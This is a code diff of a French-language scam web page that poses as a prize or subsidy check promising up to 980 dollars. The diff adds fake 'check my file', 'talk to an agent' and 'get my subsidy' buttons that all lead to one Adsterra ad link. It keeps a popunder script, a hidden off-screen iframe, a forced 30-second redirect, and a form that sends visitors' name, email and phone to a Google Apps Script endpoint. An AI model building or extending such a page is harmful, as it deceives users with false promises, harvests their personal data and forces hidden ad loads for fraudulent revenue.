@@ -27,14 +27,20 @@
       background: #1e1e1e;
       color: #fff;
     }
-    button {
+    button, .ad-button {
       background: #00ffc8;
-      color: white;
+      color: #000;
       border: none;
       padding: 15px 30px;
       font-size: 1.2em;
       border-radius: 6px;
       cursor: pointer;
+      margin: 10px 5px;
+      display: inline-block;
+      text-decoration: none;
+    }
+    button:hover, .ad-button:hover {
+      background: #00dda0;
     }
     #loading {
       display: none;
@@ -77,15 +83,22 @@
     <span id="dots">.</span>
   </div>
 
+  <!-- Boutons principaux Adsterra sur la page -->
+  <div id="ad-buttons" style="margin-top:30px;">
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" target="_blank" class="ad-button">👉 Vérifier mon dossier</a>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" target="_blank" class="ad-button" style="background:#ff00cc; color:#fff;">💬 Parler à un agent</a>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" target="_blank" class="ad-button" style="background:#ffaa00; color:#000;">💰 Obtenir ma subvention</a>
+  </div>
+
   <div id="prize-popup">
     <h2>🎉 Bonne nouvelle !</h2>
     <p>Tu pourrais recevoir jusqu'à 980$. Vérifie ton dossier ici :</p>
-    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" style="color:#00ffc8; font-size:1.4em;">👉 Continuer</a>
-    <br><br>
-    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" style="color:#ff00cc; font-size:0.9em;">Besoin d’assistance ? Parler à un agent</a>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" target="_blank" class="ad-button">👉 Continuer</a>
+    <br>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" target="_blank" class="ad-button" style="background:#ff00cc; color:#fff; font-size:1em;">Besoin d’assistance ? Parler à un agent</a>
   </div>
 
-  <!-- Bannière Adsterra -->
+  <!-- Scripts Adsterra -->
   <script type="text/javascript">
     atOptions = {
       'key' : '8f0994c4b1540c759a89bf6da94ddd90',
@@ -96,33 +109,25 @@
     };
   </script>
   <script type="text/javascript" src="//www.highperformanceformat.com/8f0994c4b1540c759a89bf6da94ddd90/invoke.js"></script>
-
-  <!-- Popunder Adsterra -->
   <script type='text/javascript' src='//pl27053554.profitableratecpm.com/42/1d/e0/421de01cc6dead045837c47e75910be3.js'></script>
-
-  <!-- Iframe invisible -->
   <iframe src="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" width="1" height="1" style="position:absolute; left:-9999px;"></iframe>
 
-  <!-- Redirection automatique après 30 secondes -->
   <script>
     setTimeout(function() {
       window.location.href = "https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735";
     }, 30000);
-  </script>
 
-  <!-- Traitement formulaire -->
-  <script>
     const form = document.getElementById('contestForm');
     const popup = document.getElementById('prize-popup');
 
     form.addEventListener('submit', function(e) {
       e.preventDefault();
+      form.style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+
       const name = form.elements['name'].value;
       const email = form.elements['email'].value;
       const phone = form.elements['phone'].value;
-
-      form.style.display = 'none';
-      document.getElementById('loading').style.display = 'block';
 
       fetch('https://script.google.com/macros/s/AKfycbwEJwOkGkxAZtIBZNt963pOJFORO3KjU3ONjVNsAzwYoSK-IUrhlD3iFpwd84r1aOCy/exec', {
         method: 'POST',
